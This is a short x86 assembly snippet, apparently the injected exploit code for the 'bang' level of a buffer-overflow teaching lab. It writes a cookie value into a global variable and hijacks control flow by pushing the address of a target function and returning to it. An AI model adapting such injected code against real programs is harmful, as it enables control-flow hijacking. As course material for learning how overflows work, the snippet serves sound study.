movl 0x0804e138, %eax    # move cookie to %eax
movl %eax, 0x0804e140    # move cookie to global_value
push $0x08048be4         # push the address of bang into stack
ret  
